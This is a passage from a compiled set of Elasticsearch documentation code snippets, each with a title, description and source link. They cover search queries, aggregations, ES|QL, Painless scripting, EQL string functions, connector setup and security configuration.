\".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Combined Text Expansion Queries with Boolean Logic in Elasticsearch\nDESCRIPTION: Demonstrates how to combine multiple text expansion queries with traditional full-text queries using boolean logic. This example searches across both title and description fields with different boost values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-text-expansion-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my-index/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        {\n          \"text_expansion\": {\n            \"ml.inference.title_expanded.predicted_value\": {\n              \"model_id\": \".elser_model_2\",\n              \"model_text\": \"How is the weather in Jamaica?\",\n              \"boost\": 1\n            }\n          }\n        },\n        {\n          \"text_expansion\": {\n            \"ml.inference.description_expanded.predicted_value\": {\n              \"model_id\": \".elser_model_2\",\n              \"model_text\": \"How is the weather in Jamaica?\",\n              \"boost\": 1\n            }\n          }\n        },\n        {\n          \"multi_match\": {\n            \"query\": \"How is the weather in Jamaica?\",\n            \"fields\": [\n              \"title\",\n              \"description\"\n            ],\n            \"boost\": 4\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Histogram Aggregation on Histogram Field in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to perform a histogram aggregation on a pre-aggregated histogram field. The aggregation computes the total number of counts for each interval specified by the 'interval' parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-histogram-aggregation.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPOST /metrics_index/_search?size=0\n{\n  \"aggs\": {\n    \"latency_buckets\": {\n      \"histogram\": {\n        \"field\": \"latency_histo\",\n        \"interval\": 5\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Method Call Examples in Painless\nDESCRIPTION: Demonstrates method calls on different reference types including Map and ArrayList operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\nMap m = new HashMap();\nm.put(1, 2);\nint z = m.get(1);\ndef d = new ArrayList();\nd.add(1);\nint i = Integer.parseInt(d.get(0).toString());\n```\n\n----------------------------------------\n\nTITLE: Query Helper Pipeline Configuration\nDESCRIPTION: Example of setting up an inference processor pipeline for chat completion tasks using OpenAI service.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/query_helper_pipeline\n{\n  \"processors\": [\n    {\n      \"script\": {\n        \"source\": \"ctx.prompt = 'Please generate an elasticsearch search query on index `articles_index` for the following natural language query. Dates are in the field `@timestamp`, document types are in the field `type` (options are `news`, `publication`), categories in the field `category` and can be multiple (options are `medicine`, `pharmaceuticals`, `technology`), and document names are in the field `title` which should use a fuzzy match. Ignore fields which cannot be determined from the natural language query context: ' + ctx.content\"\n      }\n    },\n    {\n      \"inference\": {\n        \"model_id\": \"openai_chat_completions\",\n        \"input_output\": {\n          \"input_field\": \"prompt\",\n          \"output_field\": \"query\"\n        }\n      }\n    },\n    {\n      \"remove\": {\n        \"field\": \"prompt\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Identifying High Numbers of Outbound User Connections with ESQL\nDESCRIPTION: This query identifies users with a high number of outbound connections to non-private IP addresses. It enriches user data with LDAP information, calculates the count of unique destination IPs, and flags users with 100 or more connections for follow-up.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-examples.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nFROM logs-*\n| WHERE NOT CIDR_MATCH(destination.ip, \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\")\n| STATS destcount = COUNT(destination.ip) BY user.name, host.name\n| ENRICH ldap_lookup_new ON user.name\n| WHERE group.name IS NOT NULL\n| EVAL follow_up = CASE(destcount >= 100, \"true\",\"false\")\n| SORT destcount DESC\n| KEEP destcount, host.name, user.name, group.name, follow_up\n```\n\n----------------------------------------\n\nTITLE: Filtering Active Employees with ESQL\nDESCRIPTION: ESQL query that selects first name, last name, and employment status from an employees table, filtering to show only currently hired employees. Uses KEEP for column selection and WHERE for filtering active employees.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/whereBoolean.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, still_hired\n| WHERE still_hired\n```\n\n----------------------------------------\n\nTITLE: Using Operator in Match Query\nDESCRIPTION: This code snippet illustrates the utilization of the 'operator' parameter set to 'and' in a match query, ensuring that all terms must be present in the searched documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match\": {\n      \"message\": {\n        \"query\": \"this is a test\",\n        \"operator\": \"and\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading Google Drive Connector Configuration File\nDESCRIPTION: Command to download the sample configuration file for the Google Drive connector using curl.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-google-drive.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Configuring Advanced Sync Rules in SharePoint Online\nDESCRIPTION: JSON configuration to skip extracting drive items older than specified days. This example skips extraction of files not modified in the last 60 days.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint-online.md#2025-04-22_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n{\n\t\"skipExtractingDriveItemsOlderThan\": 60\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Script Query Example\nDESCRIPTION: This snippet demonstrates a basic script query in Elasticsearch. It filters documents based on a script that calculates an amount based on the document's 'amount' and 'type' fields, and returns documents where the calculated amount is less than 10.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"bool\": {\n      \"filter\": {\n        \"script\": {\n          \"script\": \"\"\"\n            double amount = doc['amount'].value;\n            if (doc['type'].value == 'expense') {\n              amount *= -1;\n            }\n            return amount < 10;\n          \"\"\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Standard Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the standard analyzer to analyze a sample text in Elasticsearch. It shows the API call and the resulting tokenization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-standard-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"analyzer\": \"standard\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ the, 2, quick, brown, foxes, jumped, over, the, lazy, dog's, bone ]\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP Request Tracer Logger\nDESCRIPTION: Sets the logging level for the HTTP request tracer to TRACE using cluster settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nPUT _cluster/settings\n{\n   \"persistent\" : {\n      \"logger.org.elasticsearch.http.HttpTracer\" : \"TRACE\"\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types Table in Markdown\nDESCRIPTION: This markdown snippet shows a table of supported types for an ESQL function. It lists input field types and their corresponding result types, focusing on time_duration conversions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/to_timeduration.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| keyword | time_duration |\n| text | time_duration |\n| time_duration | time_duration |\n```\n\n----------------------------------------\n\nTITLE: Executing Geo-polygon Query with Array Format\nDESCRIPTION: This snippet shows how to perform a geo-polygon query using array format for defining geo-points. This format uses longitude-latitude pairs per the GeoJSON standard. The snippet requires Elasticsearch to process array-formatted geo-coordinates and outputs query matches.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-polygon-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_polygon\": {\n          \"person.location\": {\n            \"points\": [\n              [ -70, 40 ],\n              [ -80, 30 ],\n              [ -90, 20 ]\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Has Parent Query in Elasticsearch\nDESCRIPTION: Example of a has_parent query that retrieves child documents where the parent document matches a specific term query\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-has-parent-query.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"has_parent\": {\n      \"parent_type\": \"parent\",\n      \"query\": {\n        \"term\": {\n          \"tag\": {\n            \"value\": \"Elasticsearch\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using YEAR Function in Elasticsearch SQL\nDESCRIPTION: Extracts the year from a date/datetime expression. Returns null if input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_68\n\nLANGUAGE: sql\nCODE:\n```\nSELECT YEAR(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS year;\n```\n\n----------------------------------------\n\nTITLE: Using Regular Expressions with Find Operator in Painless\nDESCRIPTION: Updates all hockey players with 'b' in their last name using the find operator (=~) and update_by_query API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nPOST hockey/_update_by_query\n{\n  \"script\": {\n    \"lang\": \"painless\",\n    \"source\": \"\"\"\n      if (ctx._source.last =~ /b/) {\n        ctx._source.last += \"matched\";\n      } else {\n        ctx.op = \"noop\";\n      }\n    \"\"\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring PKCS#12 Keystore for Elasticsearch Transport SSL\nDESCRIPTION: These YAML configuration options specify the path, type, and passwords for PKCS#12 keystores and truststores used in Elasticsearch transport layer SSL/TLS.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_29\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.transport.ssl.keystore.path: \nxpack.security.transport.ssl.keystore.type: \nxpack.security.transport.ssl.keystore.password: \nxpack.security.transport.ssl.keystore.secure_password: \nxpack.security.transport.ssl.keystore.key_password: \nxpack.security.transport.ssl.keystore.secure_key_password: \nxpack.security.transport.ssl.truststore.path: \nxpack.security.transport.ssl.truststore.type: \nxpack.security.transport.ssl.truststore.password: \nxpack.security.transport.ssl.truststore.secure_password: \n```\n\n----------------------------------------\n\nTITLE: Matrix Stats Aggregation Response in Elasticsearch\nDESCRIPTION: This snippet shows the response format of a matrix_stats aggregation. It includes various statistical measures for each field, as well as covariance and correlation matrices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-matrix-stats-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"statistics\": {\n      \"doc_count\": 50,\n      \"fields\": [ {\n          \"name\": \"income\",\n          \"count\": 50,\n          \"mean\": 51985.1,\n          \"variance\": 7.383377037755103E7,\n          \"skewness\": 0.5595114003506483,\n          \"kurtosis\": 2.5692365287787124,\n          \"covariance\": {\n            \"income\": 7.383377037755103E7,\n            \"poverty\": -21093.65836734694\n          },\n          \"correlation\": {\n            \"income\": 1.0,\n            \"poverty\": -0.8352655256272504\n          }\n        }, {\n          \"name\": \"poverty\",\n          \"count\": 50,\n          \"mean\": 12.732000000000001,\n          \"variance\": 8.637730612244896,\n          \"skewness\": 0.4516049811903419,\n          \"kurtosis\": 2.8615929677997767,\n          \"covariance\": {\n            \"income\": -21093.65836734694,\n            \"poverty\": 8.637730612244896\n          },\n          \"correlation\": {\n            \"income\": -0.8352655256272504,\n            \"poverty\": 1.0\n          }\n        } ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Span Field Masking Query Example in Elasticsearch\nDESCRIPTION: This snippet demonstrates the use of `span_field_masking` query within a `span_near` query in Elasticsearch. It allows searching across different fields (e.g., 'text' and 'text.stems') as if they were the same field. The example showcases how to combine span queries across different fields by masking the field of one of the span queries, along with the `highlight` settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-field-masking-query.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_near\": {\n      \"clauses\": [\n        {\n          \"span_term\": {\n            \"text\": \"quick brown\"\n          }\n        },\n        {\n          \"span_field_masking\": {\n            \"query\": {\n              \"span_term\": {\n                \"text.stems\": \"fox\" <1>\n              }\n            },\n            \"field\": \"text\" <2>\n          }\n        }\n      ],\n      \"slop\": 5,\n      \"in_order\": false\n    }\n  },\n  \"highlight\": {\n    \"require_field_match\" : false, <3>\n    \"fields\": {\n      \"*\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customize stop filter with custom stopwords\nDESCRIPTION: This snippet creates a custom `stop` filter that removes only the stop words `and`, `is`, and `the`, and is case-insensitive. It configures a new index `my-index-000001` with the custom filter `my_custom_stop_words_filter` to be used with the default analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"default\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"my_custom_stop_words_filter\" ]\n        }\n      },\n      \"filter\": {\n        \"my_custom_stop_words_filter\": {\n          \"type\": \"stop\",\n          \"ignore_case\": true,\n          \"stopwords\": [ \"and\", \"is\", \"the\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Explicitly Ordering Highlighted Fields in Elasticsearch\nDESCRIPTION: Shows how to explicitly control the order in which fields are highlighted in Elasticsearch by specifying the fields as an array rather than an object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_18\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"highlight\": {\n    \"fields\": [\n      { \"title\": {} },\n      { \"text\": {} }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Kuromoji Baseform Token Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to set up an index with a custom analyzer using the kuromoji_tokenizer and kuromoji_baseform filter. It also includes an example of analyzing text with the configured analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-baseform.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT kuromoji_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"tokenizer\": \"kuromoji_tokenizer\",\n            \"filter\": [\n              \"kuromoji_baseform\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n\nGET kuromoji_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"飲み\"\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Average of Multivalued Field using MV_AVG in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the MV_AVG function in ESQL to calculate the average of a multivalued field. It takes an array of numbers as input and returns a single value representing the average.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_avg.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[3, 5, 1, 6]\n| EVAL avg_a = MV_AVG(a)\n```\n\n----------------------------------------\n\nTITLE: Cross-Cluster Search in SQL\nDESCRIPTION: Example of performing a cross-cluster search by specifying a remote cluster name using the <remote_cluster>:<target> syntax with wildcard pattern matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_8\n\nLANGUAGE: sql\nCODE:\n```\nSELECT emp_no FROM \"my*cluster:*emp\" LIMIT 1;\n```\n\n----------------------------------------\n\nTITLE: Configure Request Circuit Breaker Settings\nDESCRIPTION: Settings for the request circuit breaker that controls per-request data structure memory usage. Includes memory limit and overhead multiplier.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/circuit-breaker-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nindices.breaker.request.limit: \"60%\"\nindices.breaker.request.overhead: 1\n```\n\n----------------------------------------\n\nTITLE: Indexing Pre-aggregated Histogram Data in Elasticsearch\nDESCRIPTION: This snippet shows how to create an index with a histogram field and index pre-aggregated histogram data for latency metrics across different networks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-histogram-aggregation.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT metrics_index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"network\": {\n        \"properties\": {\n          \"name\": {\n            \"type\": \"keyword\"\n          }\n        }\n      },\n      \"latency_histo\": {\n         \"type\": \"histogram\"\n      }\n    }\n  }\n}\n\nPUT metrics_index/_doc/1?refresh\n{\n  \"network.name\" : \"net-1\",\n  \"latency_histo\" : {\n      \"values\" : [1, 3, 8, 12, 15],\n      \"counts\" : [3, 7, 23, 12, 6]\n   }\n}\n\nPUT metrics_index/_doc/2?refresh\n{\n  \"network.name\" : \"net-2\",\n  \"latency_histo\" : {\n      \"values\" : [1, 6, 8, 12, 14],\n      \"counts\" : [8, 17, 8, 7, 6]\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Concatenating Integer Array with MV_CONCAT and TO_STRING in ESQL\nDESCRIPTION: This example shows how to concatenate elements of a non-string array by first converting them to strings using TO_STRING function, then applying MV_CONCAT.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_concat.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[10, 9, 8]\n| EVAL j = MV_CONCAT(TO_STRING(a), \", \")\n```\n\n----------------------------------------\n\nTITLE: Filtering Terms Aggregation with Regular Expressions in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use regular expressions to include and exclude values in a terms aggregation. It creates buckets for tags containing 'sport' but excludes those starting with 'water_'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_12\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"tags\": {\n      \"terms\": {\n        \"field\": \"tags\",\n        \"include\": \".*sport.*\",\n        \"exclude\": \"water_.*\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: EQL Sequence Search Result with Shared Field Values in Elasticsearch\nDESCRIPTION: Shows the response format for an EQL sequence search with shared field values, including the 'join_keys' property containing the shared values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_10\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"hits\": ...,\n    \"sequences\": [\n      {\n        \"join_keys\": [\n          2012\n        ],\n        \"events\": ...\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Preserving Index Blocks from Source Index\nDESCRIPTION: This example shows how to preserve the index blocks from the source index by setting the 'remove_index_blocks' parameter to false. By default, this parameter is true to make the new index immediately writable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/create-index-from-source.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\nPOST _create_from/my-index/my-new-index\n{\n  \"remove_index_blocks\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing and Querying Documents by _id Field in Elasticsearch\nDESCRIPTION: This example demonstrates how to create documents with specific IDs and then query them using the _id field with the terms query. The snippet shows creating two documents with IDs 1 and 2, then retrieving them in a search query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-id-field.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n# Example documents\nPUT my-index-000001/_doc/1\n{\n  \"text\": \"Document with ID 1\"\n}\n\nPUT my-index-000001/_doc/2?refresh=true\n{\n  \"text\": \"Document with ID 2\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"terms\": {\n      \"_id\": [ \"1\", \"2\" ] <1>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: YearMonth Methods and Fields\nDESCRIPTION: Details the methods and fields within the java.time.YearMonth class. This section outlines how to create, parse, and manipulate YearMonth instances, enabling functionalities such as comparisons, formatting, retrieving month and year values, and performing date-related calculations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_14\n\nLANGUAGE: java\nCODE:\n```\n\"class java.time.YearMonth {\n  LocalDate atDay(int)\n  LocalDate atEndOfMonth()\n  int compareTo(YearMonth)\n  String format(DateTimeFormatter)\n  YearMonth from(TemporalAccessor)\n  Month getMonth()\n  int getMonthValue()\n  int getYear()\n  boolean isAfter(YearMonth)\n  boolean isBefore(YearMonth)\n  boolean isLeapYear()\n  boolean isValidDay(int)\n  int lengthOfMonth()\n  int lengthOfYear()\n  YearMonth minus(TemporalAmount)\n  YearMonth minus(long,TemporalUnit)\n  YearMonth minusYears(long)\n  YearMonth minusMonths(long)\n  YearMonth of(int,int)\n  YearMonth parse(CharSequence)\n  YearMonth parse(CharSequence,DateTimeFormatter)\n  YearMonth plus(TemporalAmount)\n  YearMonth plus(long,TemporalUnit)\n  YearMonth plusYears(long)\n  YearMonth plusMonths(long)\n  YearMonth with(TemporalAdjuster)\n  YearMonth with(TemporalField,long)\n  YearMonth withYear(int)\n  YearMonth withMonth(int)\n}\"\n```\n\n----------------------------------------\n\nTITLE: Using Artificial Documents in more_like_this Query\nDESCRIPTION: An advanced example demonstrating how to use artificial documents (not present in the index) along with existing documents in a more_like_this query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-mlt-query.md#2025-04-22_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"more_like_this\": {\n      \"fields\": [ \"name.first\", \"name.last\" ],\n      \"like\": [\n        {\n          \"_index\": \"marvel\",\n          \"doc\": {\n            \"name\": {\n              \"first\": \"Ben\",\n              \"last\": \"Grimm\"\n            },\n            \"_doc\": \"You got no idea what I'd... what I'd give to be invisible.\"\n          }\n        },\n        {\n          \"_index\": \"marvel\",\n          \"_id\": \"2\"\n        }\n      ],\n      \"min_term_freq\": 1,\n      \"max_query_terms\": 12\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Response for Average Bucket Aggregation Query\nDESCRIPTION: Example response from Elasticsearch for a query using the average bucket aggregation. This snippet shows the structure of the returned data, including the sales per month buckets and the calculated average monthly sales.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-avg-bucket-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 11,\n  \"timed_out\": false,\n  \"_shards\": ...,\n  \"hits\": ...,\n  \"aggregations\": {\n    \"sales_per_month\": {\n      \"buckets\": [\n        {\n          \"key_as_string\": \"2015/01/01 00:00:00\",\n          \"key\": 1420070400000,\n          \"doc_count\": 3,\n          \"sales\": {\n            \"value\": 550.0\n          }\n        },\n        {\n          \"key_as_string\": \"2015/02/01 00:00:00\",\n          \"key\": 1422748800000,\n          \"doc_count\": 2,\n          \"sales\": {\n            \"value\": 60.0\n          }\n        },\n        {\n          \"key_as_string\": \"2015/03/01 00:00:00\",\n          \"key\": 1425168000000,\n          \"doc_count\": 2,\n          \"sales\": {\n            \"value\": 375.0\n          }\n        }\n      ]\n    },\n    \"avg_monthly_sales\": {\n      \"value\": 328.33333333333333,\n      \"value_as_string\": \"328.33\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Terms Aggregation with Document Count Error in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the show_term_doc_count_error parameter in a Terms aggregation to display the document count error upper bound for each bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"products\": {\n      \"terms\": {\n        \"field\": \"product\",\n        \"size\": 5,\n        \"show_term_doc_count_error\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example Configuration for PostgreSQL Connector\nDESCRIPTION: This YAML configuration snippet is used to set the connection parameters for the PostgreSQL connector. It includes fields for Elasticsearch host, API key, and connector ID that need to be replaced with user-specific values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-postgresql-connector-client-tutorial.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch:\n  host: <https://<my-elastic-deployment.es.us-west2.gcp.elastic-cloud.com>> # Your Elasticsearch endpoint\n  api_key: '<YOUR-API-KEY>' # Your top-level Elasticsearch API key\n...\nconnectors:\n  -\n    connector_id: \"<YOUR-CONNECTOR-ID>\"\n    api_key: \"'<YOUR-API-KEY>\" # Your scoped connector index API key (optional). If not provided, the top-level API key is used.\n    service_type: \"postgresql\"\n\n    # Self-managed connector settings\n    connector_id: '<YOUR-CONNECTOR-ID>' # Your connector ID\n    service_type: 'postgresql'  # The service type for your connector\n\n    sources:\n      postgresql: connectors.sources.postgresql:PostgreSQLDataSource\n\n```\n\n----------------------------------------\n\nTITLE: Retrieving Flat Settings in Elasticsearch\nDESCRIPTION: Demonstrates how to use the flat_settings flag to control the format of returned settings. When true, settings are returned in a flat format, and when false, they are returned in a more human-readable structured format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/common-options.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_settings?flat_settings=true\n```\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_settings?flat_settings=false\n```\n\n----------------------------------------\n\nTITLE: Calculating Average of Multi-Value Array with MV_AVG in ESQL\nDESCRIPTION: This example demonstrates how to use the MV_AVG function to calculate the average value of elements in a multi-value array field. The function takes an array as input and returns a double value representing the average of all elements in the array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_avg.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[3, 5, 1, 6]\n| EVAL avg_a = MV_AVG(a)\n```\n\n----------------------------------------\n\nTITLE: EQL EndsWith Function Examples\nDESCRIPTION: Examples showing the endsWith function for string matching with case-sensitive and case-insensitive options. Includes null handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_5\n\nLANGUAGE: eql\nCODE:\n```\nendsWith(\"regsvr32.exe\", \".exe\")          // returns true\nendsWith(\"regsvr32.exe\", \".EXE\")          // returns false\nendsWith(\"regsvr32.exe\", \".dll\")          // returns false\nendsWith(\"\", \"\")                          // returns true\n\n// Make matching case-insensitive\nendsWith~(\"regsvr32.exe\", \".EXE\")         // returns true\n\n// file.name = \"regsvr32.exe\"\nendsWith(file.name, \".exe\")               // returns true\nendsWith(file.name, \".dll\")               // returns false\n\n// file.extension = \".exe\"\nendsWith(\"regsvr32.exe\", file.extension)  // returns true\nendsWith(\"ntdll.dll\", file.name)          // returns false\n\n// null handling\nendsWith(\"regsvr32.exe\", null)            // returns null\nendsWith(\"\", null)                        // returns null\nendsWith(null, \".exe\")                    // returns null\nendsWith(null, null)                      // returns null\n```\n\n----------------------------------------\n\nTITLE: Handling Ignored Field Values in Elasticsearch\nDESCRIPTION: Example showing how to index a document with a field that ignores certain values due to size restrictions, and how these ignored values appear in search results under the 